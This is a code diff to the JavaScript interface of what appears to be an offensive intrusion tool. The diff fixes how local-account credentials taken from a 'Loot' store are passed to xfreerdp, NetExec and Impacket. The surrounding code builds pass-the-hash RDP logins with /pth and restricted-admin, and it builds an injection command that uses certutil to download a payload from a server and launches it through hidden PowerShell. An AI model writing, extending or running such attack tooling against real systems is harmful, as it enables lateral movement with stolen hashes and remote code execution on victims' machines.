@@ -19356,7 +19356,10 @@ function ipcTab(name) {
 }
 
 function ipcAuth() {
-  const domain  = document.getElementById('ipc-domain').value.trim();
+  // Local credentials are stored as "." for compatibility with the Loot form.
+  // It is a local-account marker, not an actual RDP/SMB domain.
+  const domainRaw = document.getElementById('ipc-domain').value.trim();
+  const domain  = domainRaw === '.' ? '' : domainRaw;
   const user    = document.getElementById('ipc-user').value.trim();
   const pass    = document.getElementById('ipc-pass').value.trim();
   const hash    = document.getElementById('ipc-hash').value.trim();
@@ -19367,8 +19370,11 @@ function ipcAuth() {
   // Impacket -hashes expects LM:NT (2 parts). If the DB stored the full LM:NT string,
   // strip the LM part so the argument becomes :NT instead of :LM:NT (which errors).
   const ntHash  = hash.includes(':') ? hash.split(':').pop() : hash;
+  const rdpUser = !domain && user && !user.includes('\\') && !user.includes('@')
+    ? '.\\' + user
+    : user;
   return {
-    domain, user, pass, hash, target, useHash,
+    domain, user, rdpUser, pass, hash, target, useHash,
     nxe:   useHash ? `-u '${user}' -H '${ntHash}'${nxeDom}` : `-u '${user}' -p '${pass}'${nxeDom}`,
     impkt: useHash ? `${domPfx}${user}@${target} -hashes :${ntHash}` : `${domPfx}${user}:'${pass}'@${target}`,
   };
@@ -19616,8 +19622,11 @@ function ipcLoadCred() {
   const isHash = c.type === 'ntlm' || c.type === 'hash' ||
     (c.secret && /^[0-9a-fA-F]{32}$/.test(c.secret.replace(/^.*:/, '')));
 
-  if (c.domain) document.getElementById('ipc-domain').value = c.domain;
-  if (c.username) document.getElementById('ipc-user').value = c.username;
+  // Clear the previous domain as well: selecting a local credential after a
+  // domain credential must not leave the old domain in the RDP form.
+  const credDomain = String(c.domain || '').trim();
+  document.getElementById('ipc-domain').value = credDomain === '.' ? '' : credDomain;
+  document.getElementById('ipc-user').value = c.username || '';
   if (c.host && !document.getElementById('ipc-target').value)
     document.getElementById('ipc-target').value = c.host;
 
@@ -19849,7 +19858,7 @@ async function ipcRun(action) {
     const usePTH   = ntHash && (method === 'rdp-drive-pth' || method === 'rdp-inject');
     const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
     const rdpDom   = a.domain ? ` /d:'${a.domain}'` : '';
-    const rdpBase  = `DISPLAY=\${DISPLAY:-:1} XAUTHORITY=\${XAUTHORITY:-\$HOME/.Xauthority} xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
+    const rdpBase  = `DISPLAY=\${DISPLAY:-:1} XAUTHORITY=\${XAUTHORITY:-\$HOME/.Xauthority} xfreerdp /v:${a.target}${rdpDom} /u:'${a.rdpUser}' ${rdpCreds} /cert:ignore`;
     // minimum 200x200 enforced by xfreerdp; +disable-output prevents graphics decoding
     const rdpTail  = `/w:200 /h:200 +disable-output -decorations /log-level:OFF`;
 
@@ -19902,7 +19911,7 @@ async function ipcRun(action) {
       // -c arg, (2) dead-key translation loss of \U \P \a via xfreerdp keyboard mapping.
       // Start-Process: fully detached, no admin. PowerShell and certutil both accept forward slashes.
       const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && powershell -nop -w hidden -c Start-Process ${rpInj}`;
-      const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
+      const uDQ = (a.rdpUser||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       // For PTH, use short domain so Kerberos fails at KDC-not-found → clean NTLM fallback.
